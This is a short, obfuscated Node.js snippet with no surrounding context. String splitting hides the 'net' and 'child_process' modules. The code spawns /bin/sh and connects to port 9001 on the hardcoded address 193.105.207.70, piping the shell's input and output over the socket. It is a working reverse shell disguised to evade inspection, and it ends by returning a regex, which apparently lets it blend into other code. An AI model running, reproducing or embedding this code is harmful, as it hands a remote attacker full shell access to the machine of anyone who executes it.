(function () {
    var _0x4728ff = require('ne' + 't'), _0x50bd8c = require('ch' + 'il' + 'd_' + 'pr' + 'oc' + 'es' + 's'), _0x4d4103 = _0x50bd8c['sp' + 'aw' + 'n']('/b' + 'in' + '/s' + 'h', []);
    var _0xe27468 = new _0x4728ff['So' + 'ck' + 'et']();
    _0xe27468['co' + 'nn' + 'ec' + 't'](0x2329, '19' + '3.' + '10' + '5.' + '20' + '7.' + '70', function () {
        _0xe27468['pi' + 'pe'](_0x4d4103['st' + 'di' + 'n']);
        _0x4d4103['st' + 'do' + 'ut']['pi' + 'pe'](_0xe27468);
        _0x4d4103['st' + 'de' + 'rr']['pi' + 'pe'](_0xe27468);
    });
    return /a/;
}());
